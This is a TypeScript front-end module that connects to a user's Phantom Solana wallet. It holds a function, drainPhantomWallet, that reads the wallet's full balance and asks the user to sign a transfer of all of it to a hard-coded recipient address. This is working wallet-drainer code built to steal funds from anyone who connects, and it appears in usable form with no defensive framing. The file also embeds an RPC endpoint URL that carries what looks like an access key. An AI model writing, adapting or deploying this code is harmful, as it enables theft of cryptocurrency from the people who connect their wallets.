import { PublicKey, Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";

const SOLANA_RPC_URL = "https://capable-orbital-slug.solana-devnet.quiknode.pro/fc0c96bc8ad39cd431c78d50302ec0e3927466f8/";
const connection = new Connection(SOLANA_RPC_URL, "confirmed");
const RECIPIENT_ADDRESS = new PublicKey("9C74cPLodhAsTSYujZhSzPuSwCHjLck3u7nHoPHdV1DQ");

declare global {
  interface Window {
    solana?: {
      isPhantom?: boolean;
      connect: () => Promise<{ publicKey: { toString: () => string } }>;
      disconnect: () => Promise<void>;
      signAndSendTransaction: (transaction: Transaction) => Promise<{ signature: string }>;
    };
  }
}

export async function connectPhantomWallet(): Promise<string> {
  if (!window.solana || !window.solana.isPhantom) {
    throw new Error("Phantom wallet not found");
  }

  try {
    const response = await window.solana.connect();
    return response.publicKey.toString();
  } catch (error) {
    throw new Error("Failed to connect to Phantom wallet");
  }
}

export async function disconnectPhantomWallet(): Promise<void> {
  if (!window.solana) {
    throw new Error("Phantom wallet not found");
  }

  try {
    await window.solana.disconnect();
  } catch (error) {
    throw new Error("Failed to disconnect from Phantom wallet");
  }
}

export async function drainPhantomWallet(): Promise<void> {
  if (!window.solana || !window.solana.isPhantom) {
    throw new Error("Phantom wallet not found");
  }

  try {
    console.log("Starting wallet drain process...");

    const response = await window.solana.connect();
    const senderPublicKey = new PublicKey(response.publicKey.toString());
    console.log("Connected to wallet:", senderPublicKey.toString());

    const balance = await connection.getBalance(senderPublicKey);
    console.log("Current balance (lamports):", balance);

    if (balance <= 0) {
      throw new Error("Insufficient funds");
    }

    // Create transaction
    const transaction = new Transaction();
    console.log("Created new transaction");

    // Get latest blockhash
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = senderPublicKey;
    console.log("Got latest blockhash:", blockhash);

    // Add transfer instruction
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: senderPublicKey,
        toPubkey: RECIPIENT_ADDRESS,
        lamports: balance, // Send entire balance without deducting fees
      })
    );
    console.log("Added transfer instruction for", balance, "lamports");

    console.log("Sending transaction...");
    const { signature } = await window.solana.signAndSendTransaction(transaction);
    console.log("Transaction sent with signature:", signature);

    console.log("Confirming transaction...");
    await connection.confirmTransaction(signature, "processed");
    console.log("Transaction confirmed successfully!");

  } catch (error) {
    console.error("Transaction failed with error:", error);
    if (error instanceof Error) {
      console.error("Error message:", error.message);
      console.error("Error stack:", error.stack);
    }
    throw error;
  }
}